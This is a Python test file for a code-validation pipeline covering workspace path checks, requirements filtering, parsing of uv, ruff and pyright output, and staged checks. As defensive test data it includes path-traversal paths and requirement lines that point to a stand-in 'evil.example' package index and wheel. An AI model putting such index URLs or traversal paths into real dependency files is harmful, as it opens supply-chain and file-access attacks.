import io
import json
import tarfile
from collections.abc import AsyncIterator, Sequence
from contextlib import asynccontextmanager

import pytest

from aidev.config import get_settings
from aidev.validation.cases import apply, load_cases
from aidev.validation.checks import (
    Timeouts,
    install,
    parse_pyright,
    parse_ruff,
    parse_uv,
    requirement_problems,
)
from aidev.validation.models import Check, CheckResult, Failure, Status, trim
from aidev.validation.sandbox import ExecResult, Session
from aidev.validation.validator import Validator
from aidev.validation.workspace import Workspace, WorkspaceError

CORPUS = get_settings().corpus_dir / "validation"


class FakeSession:
    def __init__(self, install: ExecResult | None = None) -> None:
        self._install = install or ExecResult(0, "", " + stripe==16.1.0\n", 10)
        self.installs = 0

    async def install(self, timeout_s: float) -> ExecResult:
        self.installs += 1
        return self._install

    async def exec(self, argv: Sequence[str], timeout_s: float) -> ExecResult:
        return ExecResult(0, "", "", 1)


class FakeSandbox:
    def __init__(self, session: FakeSession | None = None) -> None:
        self.session_obj = session or FakeSession()

    @asynccontextmanager
    async def session(self, workspace: Workspace) -> AsyncIterator[Session]:
        yield self.session_obj


def fixed(check: Check, status: Status):
    async def run(session: Session, workspace: Workspace, timeouts: Timeouts) -> CheckResult:
        return CheckResult(check, status, f"{check} {status}")

    return run


# --- models --------------------------------------------------------------------------


def test_fingerprint_ignores_line_numbers_and_quoted_names() -> None:
    a = Failure(
        Check.PYRIGHT, "reportAttributeAccessIssue", "app/main.py", 'No "foo" on Webhook', 10
    )
    b = Failure(
        Check.PYRIGHT, "reportAttributeAccessIssue", "app/main.py", 'No "bar" on Webhook', 42
    )
    c = Failure(Check.PYRIGHT, "reportAttributeAccessIssue", "app/slack.py", 'No "foo" on Webhook')
    assert a.fingerprint == b.fingerprint
    assert a.fingerprint != c.fingerprint


def test_trim_keeps_head_and_tail() -> None:
    text = "first error\n" + "x" * 20_000 + "\n1 failed"
    out = trim(text, limit=100)
    assert out.startswith("first error") and out.endswith("1 failed")
    assert "characters trimmed" in out and len(out) < 200


def test_event_data_matches_the_ui_contract() -> None:
    result = CheckResult(Check.PYTEST, Status.FAIL, "4 failed", "trace")
    assert result.event_data(2) == {
        "iteration": 2,
        "check": "pytest",
        "status": "fail",
        "summary": "4 failed",
        "output": "trace",
    }


# --- workspace -----------------------------------------------------------------------


@pytest.mark.parametrize("path", ["/etc/passwd", "../escape.py", "app/../../x", "", "\\abs.py"])
def test_workspace_rejects_paths_outside_itself(path: str) -> None:
    with pytest.raises(WorkspaceError):
        Workspace({path: "x"})


def test_workspace_normalizes_windows_paths_and_tars_plain_files() -> None:
    ws = Workspace({"app\\main.py": "print(1)\n", "requirements.txt": "stripe\n"})
    assert list(ws.files) == ["app/main.py", "requirements.txt"]
    with tarfile.open(fileobj=io.BytesIO(ws.to_tar())) as tar:
        members = tar.getmembers()
        assert [m.name for m in members] == ["app/main.py", "requirements.txt"]
        assert all(m.isfile() and m.uid == 10001 for m in members)


def test_workspace_has_size_limits() -> None:
    with pytest.raises(WorkspaceError, match="files"):
        Workspace({f"f{i}.py": "" for i in range(201)})


# --- install -------------------------------------------------------------------------


def test_requirements_allow_only_named_pypi_packages() -> None:
    text = (
        "# deps\nstripe==16.1.0\nslack-sdk[optional]>=3 ; python_version >= '3.12'\n\n"
        "--extra-index-url https://evil.example/simple\n"
        "evil @ https://evil.example/evil-1.0-py3-none-any.whl\n"
        "-e .\nnot a requirement!!\n"
    )
    problems = requirement_problems(text)
    assert [p.line for p in problems] == [5, 6, 7, 8]
    assert all(p.kind == "disallowed" for p in problems)


# uv 0.13's messages, captured from the sandbox.
UV_ERROR = (
    "error: No solution found when resolving dependencies\n  cause: Because {}, we can conclude"
)
UV_NOT_FOUND = UV_ERROR.format(
    "stripe-billing-webhooks-helper was not found in the package registry and you require "
    "stripe-billing-webhooks-helper==2.1.0"
)
UV_NO_VERSION = UV_ERROR.format(
    "there is no version of stripe==99.0.0 and you require stripe==99.0.0"
)
UV_NO_WHEEL = UV_ERROR.format("pyyaml==5.3 has no usable wheels and you require pyyaml==5.3")


@pytest.mark.parametrize(
    ("stderr", "kind", "message"),
    [
        (UV_NOT_FOUND, "not_found", "stripe-billing-webhooks-helper doesn't exist on PyPI"),
        (UV_NO_VERSION, "no_version", "no release matches stripe==99.0.0"),
        (UV_NO_WHEEL, "no_wheel", "pyyaml==5.3 has no wheel for Linux"),
        ("error: network unreachable\n", "install_error", "network unreachable"),
    ],
)
def test_parse_uv_names_the_package(stderr: str, kind: str, message: str) -> None:
    [failure] = parse_uv(stderr)
    assert failure.kind == kind
    assert failure.message.startswith(message)


async def test_install_rejects_bad_requirements_without_running_anything() -> None:
    session = FakeSession()
    ws = Workspace({"requirements.txt": "--index-url https://evil.example/simple\n"})
    result = await install(session, ws, Timeouts())
    assert result.status is Status.FAIL
    assert session.installs == 0


async def test_install_needs_a_requirements_file() -> None:
    result = await install(FakeSession(), Workspace({"app.py": ""}), Timeouts())
    assert result.status is Status.FAIL and result.summary == "no requirements.txt"


async def test_install_reports_a_timeout() -> None:
    session = FakeSession(ExecResult(-1, "", "", 180_000, timed_out=True))
    result = await install(session, Workspace({"requirements.txt": "stripe\n"}), Timeouts())
    assert result.status is Status.FAIL
    assert result.failures[0].kind == "timeout"


# --- ruff and pyright ----------------------------------------------------------------


def test_parse_ruff() -> None:
    out = json.dumps(
        [
            {
                "code": "F821",
                "message": "Undefined name `seen`",
                "filename": "/work/app/main.py",
                "location": {"row": 34, "column": 9},
            },
            {
                "code": None,
                "message": "SyntaxError: Expected ':'",
                "filename": "/work/app/slack.py",
                "location": {"row": 3, "column": 1},
            },
        ]
    )
    a, b = parse_ruff(out)
    assert (a.kind, a.location, a.line) == ("F821", "app/main.py", 34)
    assert b.kind == "syntax"


def test_parse_pyright_counts_errors_only() -> None:
    out = json.dumps(
        {
            "generalDiagnostics": [
                {
                    "file": "/work/app/main.py",
                    "severity": "error",
                    "message": 'Cannot access attribute "verify"\n  Attribute is unknown',
                    "rule": "reportAttributeAccessIssue",
                    "range": {"start": {"line": 32, "character": 4}},
                },
                {
                    "file": "/work/app/main.py",
                    "severity": "warning",
                    "message": "Unused",
                    "range": {"start": {"line": 1, "character": 0}},
                },
            ]
        }
    )
    [f] = parse_pyright(out)
    assert (f.kind, f.location, f.line, f.message) == (
        "reportAttributeAccessIssue",
        "app/main.py",
        33,
        'Cannot access attribute "verify"',
    )


# --- validator -----------------------------------------------------------------------


async def test_a_failed_stage_skips_the_later_ones_but_not_its_siblings() -> None:
    checks = {
        Check.INSTALL: fixed(Check.INSTALL, Status.PASS),
        Check.RUFF: fixed(Check.RUFF, Status.FAIL),
        Check.PYRIGHT: fixed(Check.PYRIGHT, Status.PASS),
        Check.PYTEST: fixed(Check.PYTEST, Status.PASS),
    }
    stages = [(Check.INSTALL,), (Check.RUFF, Check.PYRIGHT), (Check.PYTEST,)]
    seen: list[CheckResult] = []

    async def on_result(r: CheckResult) -> None:
        seen.append(r)

    report = await Validator(FakeSandbox(), checks=checks, stages=stages).validate(
        Workspace({"requirements.txt": ""}), on_result
    )
    assert [(r.check, r.status) for r in report.results] == [
        (Check.INSTALL, Status.PASS),
        (Check.RUFF, Status.FAIL),
        (Check.PYRIGHT, Status.PASS),
        (Check.PYTEST, Status.SKIP),
    ]
    assert report.results[-1].summary == "skipped: ruff failed"
    assert seen == list(report.results)
    assert (report.passed, report.score, report.failed) == (False, 2, (Check.RUFF,))


# --- the seeded-bug cases ------------------------------------------------------------


def test_every_case_edit_applies_to_the_reference_solution() -> None:
    base = Workspace.from_dir(CORPUS / "base").files
    cases = load_cases(CORPUS / "cases.toml")
    assert len({c.name for c in cases}) == len(cases)
    assert [c.name for c in cases if not c.expect] == ["good"]
    for case in cases:
        edited = apply(dict(base), case)
        assert (edited == base) == (not case.edits), case.name
